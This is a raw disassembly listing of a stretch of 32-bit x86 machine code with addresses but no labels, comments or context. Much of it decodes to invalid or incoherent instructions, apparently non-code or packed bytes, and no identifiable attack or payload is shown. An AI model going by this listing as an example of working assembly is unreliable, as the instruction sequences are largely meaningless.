  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
